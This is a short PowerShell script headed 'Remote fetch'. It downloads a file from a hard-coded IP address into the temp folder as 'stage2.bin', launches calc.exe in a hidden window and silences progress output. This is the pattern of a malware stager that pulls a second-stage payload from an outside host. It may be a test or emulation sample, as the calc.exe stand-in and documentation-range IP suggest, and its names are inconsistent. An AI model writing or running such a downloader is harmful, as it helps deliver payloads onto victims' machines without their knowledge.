
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://192.0.2.11:443/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 83
)
Invoke-WebRequest -Uri $Stage2Url -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Set-Location -Path $env:TEMP
$ProgressPreference = "SilentlyContinue"
